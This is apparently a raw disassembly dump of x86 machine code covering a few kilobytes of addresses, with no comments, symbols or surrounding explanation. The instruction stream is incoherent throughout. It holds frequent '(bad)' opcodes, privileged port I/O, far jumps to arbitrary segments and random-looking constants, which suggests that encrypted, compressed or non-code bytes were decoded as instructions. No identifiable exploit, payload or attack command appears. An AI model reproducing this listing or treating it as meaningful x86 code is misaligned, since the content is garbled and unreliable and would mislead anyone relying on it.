  42efee:	js     0x42f043
  42eff0:	stc    
  42eff1:	jbe    0x42ef74
  42eff3:	xchg   esp,eax
  42eff4:	pop    esp
  42eff5:	dec    esi
  42eff6:	or     esp,eax
  42eff8:	es pop eax
  42effa:	nop
  42effb:	(bad)  
  42effc:	rol    BYTE PTR [edi],1
  42effe:	jl     0x42f03b
  42f000:	jecxz  0x42f030
  42f002:	mov    esp,0x81e7b4e5
  42f007:	std    
  42f008:	sbb    cl,BYTE PTR [edx+0x6f1d6a88]
  42f00e:	retf   
  42f00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	jnp    0x42f0e1
  42f082:	retf   
  42f083:	mov    al,0x60
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [ebx+0x4c],dh
  42f08e:	dec    ebp
  42f08f:	das    
  42f090:	mov    edi,0x443d38fb
  42f095:	icebp  
  42f096:	out    dx,eax
  42f097:	and    BYTE PTR [ecx],bh
  42f099:	int3   
  42f09a:	stos   DWORD PTR es:[edi],eax
  42f09b:	mov    WORD PTR [esi+0x7af936c5],gs
  42f0a1:	add    BYTE PTR [ecx+0x793924aa],ah
  42f0a7:	sub    BYTE PTR [ebx],dh
  42f0a9:	outs   dx,BYTE PTR ds:[esi]
  42f0aa:	in     eax,0x49
  42f0ac:	int3   
  42f0ad:	mov    ch,0x5c
  42f0af:	fdiv   QWORD PTR [edi-0x1e4887f2]
  42f0b5:	and    ebp,DWORD PTR [edi]
  42f0b7:	xlat   BYTE PTR ds:[ebx]
  42f0b8:	push   0x3f
  42f0ba:	inc    edx
  42f0bb:	xor    cl,BYTE PTR [esi+0x75]
  42f0be:	ror    bh,0x43
  42f0c1:	aaa    
  42f0c2:	sbb    ah,dl
  42f0c4:	clc    
  42f0c5:	sub    edx,DWORD PTR [esi-0x33c31323]
  42f0cb:	xor    eax,0x4a8d7dae
  42f0d0:	xchg   esi,eax
  42f0d1:	imul   esp,DWORD PTR [eax-0x76],0x32
  42f0d5:	mov    dl,0xc5
  42f0d7:	jbe    0x42f064
  42f0d9:	ds xor eax,0xf895eae9
  42f0df:	cmp    BYTE PTR [ebx],al
  42f0e1:	loop   0x42f06f
  42f0e3:	mov    esi,0xa56bdca1
  42f0e8:	sahf   
  42f0e9:	pop    es
  42f0ea:	ins    DWORD PTR es:[edi],dx
  42f0eb:	fdiv   DWORD PTR [edx+0x30]
  42f0ee:	jecxz  0x42f0d4
  42f0f0:	sub    eax,0x21099f00
  42f0f5:	mov    ds:0x72352772,al
  42f0fa:	sub    al,0x2f
  42f0fc:	mov    ds:0x1ba439b,eax
  42f101:	out    0xf8,al
  42f103:	jp     0x42f0e6
  42f105:	add    al,0x1c
  42f107:	dec    ebx
  42f108:	call   FWORD PTR [edx]
  42f10a:	dec    ebx
  42f10b:	xchg   ebp,eax
  42f10c:	je     0x42f09d
  42f10e:	mov    al,0x4c
  42f110:	add    DWORD PTR [ebp+0x4227cee0],ebx
  42f116:	xor    BYTE PTR [edi+0x476982b1],al
  42f11c:	pop    eax
  42f11d:	sbb    al,0xbc
  42f11f:	icebp  
  42f120:	add    eax,0xdbdd045c
  42f125:	into   
  42f126:	lods   eax,DWORD PTR ds:[esi]
  42f127:	sub    edx,ecx
  42f129:	pop    esi
  42f12a:	xchg   ecx,eax
  42f12b:	imul   esi,DWORD PTR [esi+ebx*4+0x6c],0xffffffca
  42f130:	cmp    al,0xa2
  42f132:	rcl    DWORD PTR [ecx+0x2b],1
  42f135:	cmp    ebp,DWORD PTR [ebp-0xd]
  42f138:	out    dx,eax
  42f139:	cld    
  42f13a:	pop    ebp
  42f13b:	add    eax,0xcea51262
  42f140:	neg    DWORD PTR [edx-0x488e7b9]
  42f146:	repz push edx
  42f148:	push   esp
  42f149:	dec    ebp
  42f14a:	ja     0x42f164
  42f14c:	rcr    DWORD PTR [ecx],cl
  42f14e:	test   al,0x3c
  42f150:	loop   0x42f15a
  42f152:	xor    al,0x49
  42f154:	xchg   esp,eax
  42f155:	xor    eax,0x18738356
  42f15a:	jbe    0x42f141
  42f15c:	or     bl,dh
  42f15e:	push   edx
  42f15f:	jbe    0x42f19f
  42f161:	and    al,0x2d
  42f163:	inc    esp
  42f164:	xor    DWORD PTR [ecx+0x322a007a],edi
  42f16a:	loope  0x42f13b
  42f16c:	xchg   ebx,eax
  42f16d:	jmp    DWORD PTR [eax+0x8667849]
  42f173:	arpl   WORD PTR [ebx],bx
  42f175:	add    al,0x89
  42f177:	mov    bh,0xd2
  42f179:	jp     0x42f194
  42f17b:	lds    esi,FWORD PTR [ebx+0x78525b27]
  42f181:	cmp    DWORD PTR [edx+0x50],eax
  42f184:	gs (bad) 
  42f186:	sbb    al,0x26
  42f188:	adc    ch,ah
  42f18a:	xor    BYTE PTR [ecx],dl
  42f18c:	lods   al,BYTE PTR ds:[esi]
  42f18d:	fidivr DWORD PTR [edx+0x2d]
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	lods   al,BYTE PTR ds:[esi]
  42f201:	stos   DWORD PTR es:[edi],eax
  42f202:	cmp    al,0x7
  42f204:	fs clc 
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	lods   al,BYTE PTR ds:[esi]
  42f20d:	addr16 jnp 0x42f277
  42f210:	add    BYTE PTR [ecx],bl
  42f212:	lods   al,BYTE PTR ds:[esi]
  42f213:	scas   al,BYTE PTR es:[edi]
  42f214:	sub    BYTE PTR [edx-0x8aeb793],bl
  42f21a:	loope  0x42f296
  42f21c:	adc    eax,0xda97f6ca
  42f221:	pop    esp
  42f222:	mov    dh,0xce
  42f224:	fld    DWORD PTR [eax-0x55]
  42f227:	addr16 into 
  42f229:	xor    eax,ecx
  42f22b:	add    dl,BYTE PTR [edx+eax*1]
  42f22e:	mov    dl,0x7a
  42f230:	leave  
  42f231:	pop    ss
  42f232:	mov    al,ah
  42f234:	sti    
  42f235:	adc    al,0x5
  42f237:	inc    ebx
  42f238:	mov    esp,0xdef32351
  42f23d:	fst    QWORD PTR [ecx+0x19]
  42f240:	mov    ds:0x98a4e210,eax
  42f245:	xchg   edi,eax
  42f246:	into   
  42f247:	mov    ch,0x29
  42f249:	jmp    0x84ef:0xd5b3c4af
  42f250:	(bad)  
  42f252:	fistp  QWORD PTR ds:0x87fff238
  42f258:	pop    edx
  42f259:	pusha  
  42f25a:	pop    es
  42f25b:	cmp    eax,0xb715982f
  42f260:	fnstenv [ebx+0x3846805a]
  42f266:	xor    bl,BYTE PTR [edx-0x31]
  42f269:	and    edx,DWORD PTR [ebx-0x4c778b94]
  42f26f:	fmul   st(5),st
  42f271:	mov    ss,WORD PTR [ebp-0x1849b193]
  42f277:	sub    BYTE PTR [esi-0x65555d82],0x1
  42f27e:	stc    
  42f27f:	cmp    bh,BYTE PTR [edx+edi*4-0x788a480b]
  42f286:	arpl   sp,dx
  42f288:	pop    eax
  42f289:	gs loope 0x42f2cb
  42f28c:	sub    DWORD PTR [edi],ebx
  42f28e:	std    
  42f28f:	popa   
  42f290:	xor    esp,DWORD PTR [ecx]
  42f292:	ret    0xacfc
  42f295:	retf   0x78da
  42f298:	sub    ebp,esp
  42f29a:	mov    ds:0xa8025312,eax
  42f29f:	xchg   edx,eax
  42f2a0:	shl    DWORD PTR [eax+0x1414ad55],1
  42f2a6:	adc    BYTE PTR [ebx],cl
  42f2a8:	ja     0x42f27e
  42f2aa:	sub    dl,dl
  42f2ac:	loopne 0x42f2c0
  42f2ae:	mov    WORD PTR [eax],cs
  42f2b0:	push   eax
  42f2b1:	fdivr  st,st(3)
  42f2b3:	not    BYTE PTR [esi+0x29]
  42f2b6:	push   cs
  42f2b7:	out    dx,eax
  42f2b8:	popa   
  42f2b9:	sub    dl,BYTE PTR [esi+0x48]
  42f2bc:	and    BYTE PTR [ebp-0x7be696d7],0x5
  42f2c3:	fimul  DWORD PTR [ebx-0x7f]
  42f2c6:	pop    ebx
  42f2c7:	mov    bl,0x48
  42f2c9:	into   
  42f2ca:	test   edx,esi
  42f2cc:	and    bl,BYTE PTR [bp+si]
  42f2cf:	pop    ebx
  42f2d0:	mov    al,dl
  42f2d2:	cmp    BYTE PTR [ebx-0x488c43fe],al
  42f2d8:	or     eax,0x39f0e479
  42f2dd:	jmp    0x24f2:0x730c88f2
  42f2e4:	(bad)  
  42f2e5:	call   FWORD PTR [edi+0x50]
  42f2e8:	call   0x6ad15b11
  42f2ed:	pop    eax
  42f2ee:	js     0x42f343
  42f2f0:	pop    eax
  42f2f1:	retf   0xe548
  42f2f4:	sub    BYTE PTR [esi+0x66],dl
  42f2f7:	outs   dx,DWORD PTR ds:[esi]
  42f2f8:	sbb    eax,0x8a66cb83
  42f2fd:	xchg   BYTE PTR [esi],dh
  42f2ff:	loop   0x42f351
  42f301:	mov    ds:0x8853dd45,eax
  42f306:	cmc    
  42f307:	pop    ecx
  42f308:	xor    ebx,DWORD PTR [edx]
  42f30a:	add    ch,BYTE PTR [eax-0x58214bf]
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	jbe    0x42f319
  42f382:	stos   DWORD PTR es:[edi],eax
  42f383:	xchg   DWORD PTR [eax-0x7],ebp
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	fisttp WORD PTR [ebp+0x59c89bef]
  42f392:	call   0x8f85:0xe71c569f
  42f399:	test   ah,dh
  42f39b:	dec    esp
  42f39c:	cmp    eax,DWORD PTR [edx-0x5]
  42f39f:	leave  
  42f3a0:	pop    esp
  42f3a1:	jns    0x42f3d7
  42f3a3:	push   esp
  42f3a4:	xchg   dl,ah
  42f3a6:	leave  
  42f3a7:	add    edi,DWORD PTR [edx]
  42f3a9:	test   BYTE PTR [edx-0x6b123af2],dh
  42f3af:	je     0x42f394
  42f3b1:	lock sbb ch,BYTE PTR [eax-0x27271e9e]
  42f3b8:	push   ecx
  42f3b9:	xchg   esi,eax
  42f3ba:	retf   
  42f3bb:	inc    eax
  42f3bc:	pop    ss
  42f3bd:	leave  
  42f3be:	sub    al,0x39
  42f3c0:	outs   dx,DWORD PTR ds:[esi]
  42f3c1:	std    
  42f3c2:	fnstenv [eax-0x7bdbd956]
  42f3c8:	jb     0x42f3e6
  42f3ca:	lock xchg edi,eax
  42f3cc:	dec    eax
  42f3cd:	ret    0x3b53
  42f3d0:	cmp    esp,DWORD PTR [ebp-0x14c6ff82]
  42f3d6:	enter  0xb5ce,0x93
  42f3da:	cmp    bl,BYTE PTR [ecx-0x32ecf588]
  42f3e0:	cmp    bh,bh
  42f3e2:	pop    ss
  42f3e3:	in     al,0xac
  42f3e5:	aam    0x1f
  42f3e7:	mov    ecx,0xf6a63eeb
  42f3ec:	mov    dl,0x53
  42f3ee:	retf   0xeb95
  42f3f1:	sbb    eax,DWORD PTR [ecx]
  42f3f3:	xlat   BYTE PTR ds:[ebx]
  42f3f4:	fild   DWORD PTR [edx+0x14]
  42f3f7:	adc    ecx,0xffffffbd
  42f3fa:	leave  
  42f3fb:	xchg   DWORD PTR [ecx+ebp*2-0x4a852765],edi
  42f402:	mov    esi,0x26770b35
  42f407:	test   esi,ebx
  42f409:	pop    edi
  42f40a:	fstp   DWORD PTR [ebp+0x3bc78c50]
  42f410:	sub    bh,BYTE PTR [ebx-0x4e4cf87e]
  42f416:	inc    ecx
  42f417:	push   cs
  42f418:	cdq    
  42f419:	add    edi,edx
  42f41b:	mov    ebx,0x3e56af73
  42f420:	rcl    BYTE PTR [esi+0x32133070],1
  42f426:	es fwait
  42f428:	adc    dl,bh
  42f42a:	xchg   ecx,eax
  42f42b:	std    
  42f42c:	inc    esi
  42f42d:	sar    DWORD PTR [edx+0x50599145],cl
  42f433:	jl     0x42f3e6
  42f435:	adc    al,0x6a
  42f437:	aad    0xb7
  42f439:	jbe    0x42f46c
  42f43b:	adc    al,0x45
  42f43d:	xchg   esi,eax
  42f43e:	mov    ds:0xbcccbafd,al
  42f443:	jne    0x42f3f6
  42f445:	scas   eax,DWORD PTR es:[edi]
  42f446:	in     al,dx
  42f447:	mov    DWORD PTR [ecx+edi*2],0xef0fc603
  42f44e:	push   ecx
  42f44f:	leave  
  42f450:	sti    
  42f451:	scas   eax,DWORD PTR es:[edi]
  42f452:	push   esp
  42f453:	push   ebp
  42f454:	fmul   QWORD PTR [eax]
  42f456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f457:	adc    eax,0x5040c190
  42f45c:	data16 loope 0x42f4a2
  42f45f:	mov    edx,DWORD PTR [esi-0x740d4385]
  42f465:	stos   DWORD PTR es:[edi],eax
  42f466:	lds    eax,FWORD PTR [esi+0x56]
  42f469:	inc    edx
  42f46a:	mov    dh,0xba
  42f46c:	out    0xa,eax
  42f46e:	fwait
  42f46f:	pop    eax
  42f470:	sub    BYTE PTR [ebx-0x57],bh
  42f473:	int3   
  42f474:	and    eax,0xc9d10c6c
  42f479:	int3   
  42f47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f47b:	imul   eax,DWORD PTR ds:0x8c25e1e8,0x3ca7b716
  42f485:	inc    edi
  42f486:	adc    eax,DWORD PTR [esi]
  42f488:	loope  0x42f40c
  42f48a:	popa   
  42f48b:	data16 lahf 
  42f48d:	sar    DWORD PTR gs:[ebx+0x0],cl
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	push   0x6cfb3230
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	sbb    eax,0x98823eaa
  42f511:	xchg   BYTE PTR [edi-0x4e4aef08],dh
  42f517:	pushf  
  42f518:	pop    ecx
  42f519:	bt     DWORD PTR [eax-0xa],eax
  42f51d:	jae    0x42f504
  42f51f:	jecxz  0x42f532
  42f521:	cli    
  42f522:	test   eax,0xcfee5b06
  42f527:	jl     0x42f597
  42f529:	add    eax,edi
  42f52b:	or     edx,DWORD PTR [esi]
  42f52d:	push   ebp
  42f52e:	rol    DWORD PTR [ebx-0x8],1
  42f531:	pusha  
  42f532:	jp     0x42f508
  42f534:	jno    0x42f4c0
  42f536:	mov    ebx,0xe3b8c7a7
  42f53b:	dec    esp
  42f53c:	mov    ch,BYTE PTR [edi+ecx*2+0x30e30101]
  42f543:	mov    bl,0xa5
  42f545:	fisub  DWORD PTR [esp+edx*4]
  42f548:	mov    esi,0x99998e63
  42f54d:	adc    ebx,DWORD PTR [esi+0x187c747a]
  42f553:	jmp    0x1c70bc59
  42f558:	fwait
  42f559:	aam    0xd
  42f55b:	add    BYTE PTR [edx+0x37],cl
  42f55e:	(bad)  
  42f55f:	push   ebp
  42f560:	scas   eax,DWORD PTR es:[edi]
  42f561:	cmp    dl,BYTE PTR [ebx+0x406201cb]
  42f567:	ja     0x42f4ed
  42f569:	imul   esp,DWORD PTR [edi],0xf33649b9
  42f56f:	xchg   esp,eax
  42f570:	and    bl,bl
  42f572:	fs inc edi
  42f574:	sbb    BYTE PTR [ebx+eiz*4-0x1b],dh
  42f578:	adc    eax,0x4dfe2cdb
  42f57d:	dec    edx
  42f57e:	sub    bh,BYTE PTR [ebx+0x2]
  42f581:	and    ebp,ecx
  42f583:	stos   BYTE PTR es:[edi],al
  42f584:	fistp  DWORD PTR [esi]
  42f586:	dec    edi
  42f587:	jnp    0x42f586
  42f589:	xor    esi,DWORD PTR [edx]
  42f58b:	jno    0x42f53f
  42f58d:	cli    
  42f58e:	push   ss
  42f58f:	cld    
  42f590:	test   al,0xa5
  42f592:	scas   eax,DWORD PTR es:[edi]
  42f593:	sub    DWORD PTR [esi+0x4b],ebx
  42f596:	push   ds
  42f597:	int    0xa2
  42f599:	push   ds
  42f59a:	add    eax,0x9b7c47c
  42f59f:	lds    edx,FWORD PTR [eax-0x38d33220]
  42f5a5:	sbb    eax,0xa80d06a6
  42f5aa:	inc    DWORD PTR [esi]
  42f5ac:	sub    edi,esp
  42f5ae:	popa   
  42f5af:	inc    ebp
  42f5b0:	mov    bl,0x94
  42f5b2:	imul   ebp,DWORD PTR [edx],0x719a9097
  42f5b8:	jno    0x42f62b
  42f5ba:	ror    DWORD PTR [edi-0x534c6985],0xb8
  42f5c1:	inc    esp
  42f5c2:	fcmove st,st(3)
  42f5c4:	popa   
  42f5c5:	xchg   esp,eax
  42f5c6:	mov    ah,0x35
  42f5c8:	pop    esi
  42f5c9:	lock sbb DWORD PTR [ebp+ecx*1-0x11],edx
  42f5ce:	mov    BYTE PTR [ebp+0x5c],bl
  42f5d1:	ja     0x42f56b
  42f5d3:	or     al,0xaa
  42f5d5:	cld    
  42f5d6:	adc    al,0x1e
  42f5d8:	in     eax,dx
  42f5d9:	mov    ds:0x759732a6,eax
  42f5de:	ss add eax,0x9f835e93
  42f5e4:	jo     0x42f64a
  42f5e6:	mov    dh,0x66
  42f5e8:	jg     0x42f614
  42f5ea:	icebp  
  42f5eb:	push   cs
  42f5ec:	ja     0x42f5d1
  42f5ee:	mov    DWORD PTR [esp+edx*2-0x72a6ebc9],eax
  42f5f5:	cmp    edi,DWORD PTR [eax]
  42f5f7:	cld    
  42f5f8:	adc    ecx,0x8b3603ea
  42f5fe:	or     BYTE PTR [ebx],al
  42f600:	fcmovu st,st(3)
  42f602:	jns    0x42f600
  42f604:	popa   
  42f605:	hlt    
  42f606:	mov    ds:0x8a6bfbe7,eax
  42f60b:	add    esi,esp
  42f60d:	stc    
  42f60e:	xor    DWORD PTR [ebx+0x0],esp
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	sbb    eax,0x703b55c3
  42f685:	sti    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	mov    ebx,0xac039b2e
  42f691:	hlt    
  42f692:	bnd jne 0x42f6a5
  42f695:	aad    0xf
  42f697:	repnz and dl,BYTE PTR [edx-0x36]
  42f69b:	adc    al,BYTE PTR [esi-0x58ed8c54]
  42f6a1:	pusha  
  42f6a2:	leave  
  42f6a3:	cwde   
  42f6a4:	(bad)  
  42f6a5:	jmp    0xcddc7f88
  42f6aa:	push   eax
  42f6ab:	call   0xa401:0xdbe07d11
  42f6b2:	xchg   edi,eax
  42f6b3:	and    esp,edi
  42f6b5:	sub    BYTE PTR [eax-0x5c],bh
  42f6b8:	in     al,dx
  42f6b9:	ins    BYTE PTR es:[edi],dx
  42f6ba:	cs ret 
  42f6bc:	push   esp
  42f6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6be:	fdivr  QWORD PTR [ebx+0x4e]
  42f6c1:	pusha  
  42f6c2:	gs inc edx
  42f6c4:	or     ebp,0xffffffc1
  42f6c7:	and    bh,BYTE PTR [edx+eiz*8+0x6fe1b9a6]
  42f6ce:	jge    0x42f69f
  42f6d0:	aam    0xcf
  42f6d2:	in     al,dx
  42f6d3:	fwait
  42f6d4:	rcr    BYTE PTR [edi],1
  42f6d6:	fsub   QWORD PTR [edi+0x14]
  42f6d9:	mov    eax,ds:0x727d9d7c
  42f6de:	cmp    bh,BYTE PTR [eax+esi*2]
  42f6e1:	out    0xb3,eax
  42f6e3:	outs   dx,BYTE PTR ds:[esi]
  42f6e4:	xchg   edi,eax
  42f6e5:	dec    edx
  42f6e6:	outs   dx,BYTE PTR ds:[esi]
  42f6e7:	fcmovnbe st,st(2)
  42f6e9:	out    0x6,eax
  42f6eb:	stos   BYTE PTR es:[edi],al
  42f6ec:	hlt    
  42f6ed:	sbb    eax,0xd00cda02
  42f6f2:	sbb    ebp,DWORD PTR [esi-0x3d3fa668]
  42f6f8:	cli    
  42f6f9:	add    al,0x5f
  42f6fb:	or     eax,ebx
  42f6fd:	mov    al,ds:0xb2c092be
  42f702:	mov    bl,0x2b
  42f704:	mov    ah,0xec
  42f706:	jae    0x42f76d
  42f708:	or     ch,BYTE PTR [edx]
  42f70a:	add    edx,esi
  42f70c:	jne    0x42f698
  42f70e:	data16 mov dh,0x90
  42f711:	jnp    0x42f781
  42f713:	imul   ebp,DWORD PTR [esi+0x6d],0xfffffffa
  42f717:	shl    DWORD PTR [ebx-0x74],cl
  42f71a:	xor    eax,DWORD PTR [esi-0x3b2c1483]
  42f720:	cmp    cl,0xb9
  42f723:	loopne 0x42f6f5
  42f725:	jle    0x42f760
  42f727:	xchg   esi,eax
  42f728:	arpl   sp,dx
  42f72a:	mov    ecx,0x814e63b5
  42f72f:	jo     0x42f701
  42f731:	xchg   ecx,eax
  42f732:	in     al,0xcc
  42f734:	mov    edi,0xa8445b06
  42f739:	dec    ebx
  42f73a:	xor    ah,BYTE PTR [eax+0x5c3e597c]
  42f740:	jnp    0x42f6d2
  42f742:	jp     0x42f79a
  42f744:	mov    esi,0x72f3eac7
  42f749:	mov    esp,0x8db546d5
  42f74e:	(bad)  
  42f74f:	imul   ebx,DWORD PTR [ebp+0x4c7b8550],0x44
  42f756:	ror    bh,0x5b
  42f759:	cmp    BYTE PTR [eax+0x52ed069e],bl
  42f75f:	push   edx
  42f760:	imul   edx,ecx,0xfffffff4
  42f763:	mov    ds:0x6d6d1fe7,eax
  42f768:	mov    edx,0x9d3b7c0e
  42f76d:	or     BYTE PTR [edx+0x23644f4a],0x62
  42f774:	pop    ecx
  42f775:	xchg   esi,eax
  42f776:	and    ecx,DWORD PTR [esi-0x1d010fc5]
  42f77c:	sub    ebx,DWORD PTR [ebx+0x6055fde3]
  42f782:	adc    DWORD PTR ds:[edx],0x6c
  42f786:	aad    0xa
  42f788:	mov    esp,0xf49e31f7
  42f78d:	shl    BYTE PTR [eax-0x2a],cl
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x50aa95f4
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	and    eax,0x86f261e9
  42f811:	lds    ebp,FWORD PTR [esi]
  42f813:	dec    BYTE PTR [edx]
  42f815:	mov    WORD PTR [ebx-0x2c],?
  42f818:	xor    bl,BYTE PTR [edx]
  42f81a:	in     al,dx
  42f81b:	cld    
  42f81c:	jmp    0x2990:0x365affe6
  42f823:	xor    cl,BYTE PTR [esi]
  42f825:	xor    bh,al
  42f827:	mov    esi,0xad465f5b
  42f82c:	mov    DWORD PTR [edx],ebp
  42f82e:	or     eax,0x71dd9579
  42f833:	sub    BYTE PTR [ebp-0x76],dl
  42f836:	mov    DWORD PTR [ebp+0x284271b0],ecx
  42f83c:	add    esi,DWORD PTR [ebp+0x7f]
  42f83f:	loopne 0x42f802
  42f841:	dec    esp
  42f842:	dec    esp
  42f843:	rol    BYTE PTR [edi],cl
  42f845:	adc    BYTE PTR [esi+0x11],ah
  42f848:	mov    dl,0x28
  42f84a:	adc    BYTE PTR [eax],cl
  42f84c:	jecxz  0x42f8a3
  42f84e:	mov    esi,0xef8b0052
  42f853:	jge    0x42f82f
  42f855:	sub    edi,DWORD PTR [eax-0x30]
  42f858:	add    esi,DWORD PTR [edx-0x40]
  42f85b:	inc    BYTE PTR [edx+0x8e3ebd]
  42f861:	adc    esp,DWORD PTR [edi-0x3275f60a]
  42f867:	shl    DWORD PTR [edi+esi*1],1
  42f86a:	scas   al,BYTE PTR es:[edi]
  42f86b:	aam    0xe4
  42f86d:	dec    edi
  42f86e:	jb     0x42f82b
  42f870:	ret    
  42f871:	dec    esp
  42f872:	push   ebp
  42f873:	or     eax,0x624d7987
  42f878:	xor    BYTE PTR [edx],dh
  42f87a:	jecxz  0x42f890
  42f87c:	inc    ebp
  42f87d:	fist   DWORD PTR [ebx+0x4ca989ef]
  42f883:	lods   eax,DWORD PTR ds:[esi]
  42f884:	rcr    BYTE PTR [edx+0x15],cl
  42f887:	push   ebx
  42f888:	jno    0x42f846
  42f88a:	dec    edx
  42f88b:	fadd   QWORD PTR [ebp+0x7c]
  42f88e:	xchg   ebx,eax
  42f88f:	mov    edx,0x90f80746
  42f894:	push   esi
  42f895:	add    eax,0xd14032da
  42f89a:	out    dx,al
  42f89b:	adc    BYTE PTR [eax],al
  42f89d:	in     al,dx
  42f89e:	pop    edx
  42f89f:	fucomip st,st(2)
  42f8a1:	mov    ds:0xd1f986be,eax
  42f8a6:	in     al,0x5f
  42f8a8:	retf   0x59bd
  42f8ab:	jno    0x42f89a
  42f8ad:	sahf   
  42f8ae:	and    eax,0xd2adf001
  42f8b3:	dec    ebp
  42f8b4:	idiv   DWORD PTR [edx]
  42f8b6:	dec    ebx
  42f8b7:	adc    DWORD PTR [edi-0x7f],edx
  42f8ba:	dec    ebx
  42f8bb:	ins    BYTE PTR es:[edi],dx
  42f8bc:	add    al,0x71
  42f8be:	or     al,0x16
  42f8c0:	stos   BYTE PTR es:[edi],al
  42f8c1:	and    bl,ch
  42f8c3:	loopne 0x42f85f
  42f8c5:	bnd jno 0x42f8ba
  42f8c8:	enter  0x16d9,0x57
  42f8cc:	pop    ecx
  42f8cd:	adc    ecx,DWORD PTR [edx-0x6f]
  42f8d0:	daa    
  42f8d1:	loop   0x42f85c
  42f8d3:	push   ss
  42f8d4:	aad    0xc4
  42f8d6:	mov    cl,0xe0
  42f8d8:	cwde   
  42f8d9:	jg     0x42f8ef
  42f8db:	mov    bl,0x78
  42f8dd:	fiadd  WORD PTR ds:0xfd843a7b
  42f8e3:	sbb    DWORD PTR [esi+0x7fbb4e66],ecx
  42f8e9:	mov    edi,DWORD PTR [edi-0x7d3dec79]
  42f8ef:	lock iret 
  42f8f1:	in     al,0x8a
  42f8f3:	xor    BYTE PTR [edi],ah
  42f8f5:	mov    ch,0xe9
  42f8f7:	jecxz  0x42f8c0
  42f8f9:	sti    
  42f8fa:	xchg   esp,eax
  42f8fb:	and    ecx,ebp
  42f8fd:	xor    DWORD PTR [esi+0x2a0b4963],0x5492e2de
  42f907:	repnz push edi
  42f909:	and    eax,0x35779a3c
  42f90e:	stc    
  42f90f:	mov    BYTE PTR [eax],al
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9f4
  42f981:	div    BYTE PTR [esi+0x1fd7814]
  42f987:	add    BYTE PTR [ecx+eax*1],al
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	mov    bh,0xd8
  42f98e:	aam    0x4b
  42f990:	push   0xd5171308
  42f995:	push   ss
  42f996:	mov    edi,0x8470038b
  42f99b:	(bad)  
  42f99c:	(bad)  
  42f99d:	mov    edi,0x724a838a
  42f9a2:	xor    DWORD PTR [edx],0x48
  42f9a5:	add    eax,esi
  42f9a7:	fimul  DWORD PTR [ebx+esi*8-0x71]
  42f9ab:	or     al,0x57
  42f9ad:	mov    al,ch
  42f9af:	fmul   st(3),st
  42f9b1:	mov    ch,0x92
  42f9b3:	sbb    ch,BYTE PTR [ecx+0x6d474ac3]
  42f9b9:	ret    
  42f9ba:	or     eax,0xe78cf1aa
  42f9bf:	push   ebp
  42f9c0:	arpl   WORD PTR [edx],si
  42f9c2:	loopne 0x42fa32
  42f9c4:	pop    esp
  42f9c5:	and    DWORD PTR [edi+0x265db687],ebx
  42f9cb:	sbb    eax,0x4772df3c
  42f9d0:	shr    esi,1
  42f9d2:	sahf   
  42f9d3:	jp     0x42fa22
  42f9d5:	aaa    
  42f9d6:	iret   
  42f9d7:	xchg   DWORD PTR [edx-0x60c83042],esi
  42f9dd:	es dec ebp
  42f9df:	and    al,0x47
  42f9e1:	xor    eax,0x35d67f96
  42f9e6:	ins    BYTE PTR es:[edi],dx
  42f9e7:	cmp    DWORD PTR [esi+0x34],0x60
  42f9eb:	pusha  
  42f9ec:	int    0x99
  42f9ee:	cmp    dh,BYTE PTR [ebp-0x1f]
  42f9f1:	inc    eax
  42f9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9f3:	ins    BYTE PTR es:[edi],dx
  42f9f4:	sub    DWORD PTR [eax],0xffffffbe
  42f9f7:	cwde   
  42f9f8:	sbb    BYTE PTR [edx+0x33],ah
  42f9fb:	fcomp  QWORD PTR [edx+0x5b68dbc4]
  42fa01:	sub    edi,eax
  42fa03:	and    ebp,DWORD PTR [eax+0x11e41c4]
  42fa09:	mov    WORD PTR [ebp+eax*2-0x9],cs
  42fa0d:	push   0x6e0437ce
  42fa12:	sahf   
  42fa13:	dec    edx
  42fa14:	(bad)  
  42fa15:	jecxz  0x42fa03
